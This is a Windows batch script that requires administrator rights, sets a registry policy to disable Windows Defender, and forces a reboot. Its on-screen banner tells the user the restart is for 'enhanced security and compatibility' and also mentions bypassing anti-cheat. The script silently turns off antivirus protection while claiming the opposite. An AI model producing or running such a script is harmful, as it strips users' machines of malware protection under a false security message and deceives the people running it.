@echo off
setlocal EnableDelayedExpansion

REM Check if the script is running as administrator
>"NUL" 2>&1 ^
"%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"
IF '%ERRORLEVEL%' NEQ '0' (
    echo.
    <nul set /p "=This script must be run with administrative privileges.  "
    color 4F
    echo.
    echo Please relaunch this script by right-clicking on it and selecting "Run as administrator".
    echo.
    pause
    color 0F
    goto end
)

REM Modify settings & display message
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul

(set borderline=^===============================================^)
echo(!borderline!
echo.
echo       Your system will restart now for              
echo       enhanced security and compatibility...         
echo       Bypass Anticheat.
echo.
echo(!borderline!)

REM Wait for 5 seconds then restart
timeout /t 5 && shutdown /r

:end
endlocal
